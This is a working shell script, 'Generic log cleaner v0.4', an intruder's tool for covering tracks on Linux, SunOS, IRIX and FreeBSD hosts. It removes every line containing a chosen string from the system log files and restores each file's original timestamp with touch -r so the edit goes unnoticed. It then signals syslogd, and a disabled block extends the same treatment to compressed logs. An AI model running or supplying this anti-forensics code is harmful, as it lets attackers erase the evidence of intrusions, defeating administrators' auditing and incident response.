#!/bin/sh
#
#	Generic log cleaner v0.4 By: Tragedy/Dor (dor@kaapeli.net)
#		Based on sauber..
#
#  This is TOTALLY incomplete... I never added support for IRIX or SunOS...
#  And.. i most likely never will.. And i take no responsibility for any use/misuse
#  of this tool..
#
# Notes-0.3
#   SunOS support added.. had to rewrite most of it :P
# Notes-0.4
#   Beta IRIX support added and enabled...

colours()
{
BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'
}
colours


banner()
{
echo "${DCYN}Log cleaner ${WHI}v0.4b By: Tragedy/Dor"
}

banner

if [ $# != 1 ]
then
  echo "${WHI}* ${DWHI}Usage${WHI}: "`basename $0`" <${DWHI}string${WHI}>${RES}"
  echo " "
  exit
fi
echo "OS detection...."
OS=`uname -s`
GZIP=`which gzip`
#if [ $GZIP != "" ]
#then
#echo "${WHI}* ${DWHI}GZIP found in ${DCYN}$GZIP${DWHI}, Compressed logs will be cleaned"
#GZIP=YES
#fi 
echo "Detected ${DCYN}$OS${DWHI}"
#echo "Log cleaning in process...."

        case ${OS} in
                Linux)
WERD=`/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "btmp" | grep -v "utmp" | grep -v "wtmp" | grep -v "@"`
#		WERDGZ=$(/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz"|grep -v ".tar.gz" | grep -v "btmp" |grep ".gz"| grep -v "@")
		LOGPATH="/var/log"
			;;
		SunOS)
                LOGPATH="/var/adm"
WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
			;;
		IRIX)
                LOGPATH="/var/adm"
WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
                        ;;
		FreeBSD)
		WERD=`/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "utmp" | grep -v "wtmp" | grep -v "@"`
#		WERDGZ=$(/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz"|grep -v ".tar.gz" |grep ".gz"| grep -v "@")
		LOGPATH="/var/log"
			;;
		*)
		echo "${WHI}*${DWHI} ${RED} FATAL ERROR ${DWHI} Your O/S ${YEL}${OS}${DWHI} is UNKNOWN!"
		exit 10
			;;
                esac



echo "---<[ Log cleaning in process...."
for fil in $WERD
do
   lines=`cat $LOGPATH/$fil | wc -l`
   printf "${WHI}* ${DWHI}Cleaning ${DCYN}$fil ${DWHI}($lines ${DWHI}lines${WHI})${BLK}...${RES}"
   grep -v $1 $LOGPATH/$fil > new
   touch -r $LOGPATH/$fil new
   mv -f new $LOGPATH/$fil
   newlines=`cat $LOGPATH/$fil | wc -l`
   linedel=`expr $lines - $newlines`
   printf "${WHI}$linedel ${DWHI}lines removed!${RES}\n"

done
#if [ $GZIP != "" ]
#then#
#	echo "---<[ Decompressing gzipped logfiles...."
#	TMPDIR=$RANDOM$RANDOM$RANDOM$RANDOM
#	# Ok.. so theres a race condition here :)
#	mkdir /tmp/$TMPDIR
#	for fil in $WERDGZ
#	do
#	  cp $LOGPATH/$fil /tmp/$TMPDIR/
#	  rm $LOGPATH/$fil
#	  gzip -d /tmp/$TMPDIR/$fil
#	  echo "${WHI}* ${DWHI} Putting ${DCYN}$fil${DWHI} to /tmp/$TMPDIR/ .... ${WHI}Decompressed${DWHI}"
#	done
#
#	WERD2=$(/bin/ls -F /tmp/$TMPDIR/ | grep -v "/" | grep -v "*" | grep -v ".tgz"|grep -v ".gz" | grep -v "utmp" | grep -v"wtmp" | grep -v "@")
#
#	echo "---<[ Cleaning gzipped logfiles..."
#	for fil in $WERD2
#	do
#	   line=$(wc -l /tmp/$TMPDIR/$fil | awk -F ' ' '{print $1}')
#	   echo -n "${WHI}* ${DWHI}Cleaning ${DCYN}$fil ${DWHI}($line ${DWHI}lines${WHI})${BLK}...${RES}"
#	   grep -v $1 /tmp/$TMPDIR/$fil > new
#	   touch -r /tmp/$TMPDIR/$fil new
#	   mv -f new /tmp/$TMPDIR/$fil
#	   newline=$(wc -l /tmp/$TMPDIR/$fil | awk -F ' ' '{print $1}')
#	   linedel=`expr $line - $newline`
#	   gzip -9 /tmp/$TMPDIR/$fil
#	   echo "${WHI}$linedel ${DWHI}lines removed!${RES}"
#	   cp /tmp/$TMPDIR/$fil.gz $LOGPATH/
#	   rm /tmp/$TMPDIR/$fil.gz
#	done
#rmdir /tmp/$TMPDIR
#fi

if [ $OS = "Linux" ]
then
echo "Linux detected... rehashing syslog"
killall -HUP syslogd
fi

